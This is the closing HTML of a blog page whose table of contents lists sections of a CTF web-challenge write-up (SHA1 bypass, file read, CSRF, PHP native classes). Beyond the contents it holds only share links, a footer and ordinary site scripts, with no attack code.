+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Welcome"><span class="toc-number">1.</span> <span class="toc-text">web-Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95-sha1%E5%93%88%E5%B8%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">#请求方法+sha1哈希绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Myblog"><span class="toc-number">2.</span> <span class="toc-text">web-Myblog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-zip%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.</span> <span class="toc-text">#任意文件读取+zip伪协议文件上传</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Rceme"><span class="toc-number">3.</span> <span class="toc-text">web-Rceme</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%BF%90%E7%AE%97"><span class="toc-number">3.1.</span> <span class="toc-text">哈希运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E8%84%9A%E6%9C%ACpoc"><span class="toc-number">3.2.</span> <span class="toc-text">取反脚本poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flagshop"><span class="toc-number">4.</span> <span class="toc-text">flagshop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">4.1.</span> <span class="toc-text">#CSRF跨站请求伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%B4%E4%B8%AAMD5%E6%88%AA%E6%96%AD%E5%8A%A0%E5%AF%86%E7%9A%84%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text">贴个MD5截断加密的解密脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Greatphp"><span class="toc-number">5.</span> <span class="toc-text">Greatphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">Exception原生类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">5.2.</span> <span class="toc-text">Error原生类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FighterFightsInvincibly"><span class="toc-number">6.</span> <span class="toc-text">FighterFightsInvincibly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#creat-function-%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">creat_function()函数</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=极客大挑战2020wp--web(已做完)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=极客大挑战2020wp--web(已做完)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2020wp--web(已做完)&body=Check out this article: https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=极客大挑战2020wp--web(已做完)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=极客大挑战2020wp--web(已做完)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
